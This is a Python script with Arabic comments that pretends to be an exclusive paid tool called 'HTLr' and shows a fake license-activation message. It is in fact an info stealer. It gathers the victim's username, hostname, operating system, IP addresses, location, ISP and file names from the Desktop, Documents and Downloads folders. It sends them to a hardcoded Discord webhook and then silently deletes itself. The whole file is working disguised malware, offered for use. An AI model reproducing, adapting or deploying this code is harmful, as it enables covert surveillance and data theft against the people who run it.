import os
import sys
import platform
import socket
import requests
import json
import subprocess
import time
from datetime import datetime

# إعدادات الويبهوك حقك - ثابت لا يتغير
WEBHOOK = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"

BANNER = """
#######################################################
#   HTLr - EXCLUSIVE PAID TOOL - PRIVATE VERSION      #
#   !!! جاري تحميل الإعدادات الحصرية لـ # HTLr !!!        #
#######################################################
"""

def get_full_intel():
    """جمع معلومات دقيقة جداً عن الضحية جهازه وملفاته"""
    data = {}
    try:
        # معلومات النظام الأساسية
        data['user'] = os.getlogin() if os.name == 'nt' else os.getenv('USER')
        data['node'] = platform.node()
        data['sys'] = f"{platform.system()} {platform.release()}"
        data['arch'] = platform.machine()
        
        # معلومات الشبكة
        data['local_ip'] = socket.gethostbyname(socket.gethostname())
        try:
            pub_info = requests.get('http://ip-api.com/json/').json()
            data['pub_ip'] = pub_info.get('query')
            data['loc'] = f"{pub_info.get('city')}, {pub_info.get('country')}"
            data['isp'] = pub_info.get('isp')
        except:
            data['pub_ip'] = "N/A"
            
        # كشف الملفات الحساسة (أسماء فقط للسرعة)
        important_dirs = ['Desktop', 'Documents', 'Downloads']
        files_found = []
        for folder in important_dirs:
            p = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(p):
                files_found.append(f"--- {folder} ---")
                files_found.extend(os.listdir(p)[:10]) # يسحب أول 10 ملفات من كل مكان
        
        data['files'] = "\n".join(files_found)
        
    except Exception as e:
        data['error'] = str(e)
    return data

def send_to_hq(intel):
    """إرسال الصيدة للديسكورد بتنسيق HTLr"""
    embed = {
        "title": "🎯 صيدة جديدة [HTLr EXCLUSIVE]",
        "color": 0xFF0000, # أحمر
        "fields": [
            {"name": "👤 الضحية", "value": f"```{intel['user']} @ {intel['node']}```", "inline": True},
            {"name": "🌍 الموقع والآيبي", "value": f"```IP: {intel['pub_ip']}\nLoc: {intel.get('loc', 'Unknown')}```", "inline": True},
            {"name": "💻 نظام التشغيل", "value": f"```{intel['sys']} ({intel['arch']})```", "inline": False},
            {"name": "📦 شركة الاتصال (ISP)", "value": f"```{intel.get('isp', 'N/A')}```", "inline": False},
            {"name": "📂 قائمة بملفات الضحية", "value": f"```\n{intel['files'][:800]}```", "inline": False},
            {"name": "📌 تاق الأداة", "value": "#HTLr LINK TRACK", "inline": True}
        ],
        "footer": {"text": "Z7F LINK TRACK | DENGER ☢️ | " + datetime.now().strftime("%H:%M:%S")}
    }
    
    payload = {"username": "HTLr SYSTEM", "embeds": [embed]}
    requests.post(WEBHOOK, json=payload)

def self_delete():
    """مسح الملف من الجهاز فوراً وبصمت"""
    path = os.path.abspath(sys.argv[0])
    try:
        if os.name == 'nt': # Windows
            subprocess.Popen(f"timeout /t 3 & del \"{path}\"", shell=True)
        else: # Linux/Android
            os.remove(path)
    except:
        pass

if __name__ == "__main__":
    # تمويه الضحية
    print(BANNER)
    print("[*] جارٍ تفعيل مفتاح الترخيص...")
    
    # تنفيذ الصيد في الخلفية
    try:
        intel_data = get_full_intel()
        send_to_hq(intel_data)
        print("[+] تم تفعيل الأداة بنجاح! سيتم البدء الآن...")
    except:
        pass
    
    # انتحار الملف
    time.sleep(2)
    self_delete()
    sys.exit()
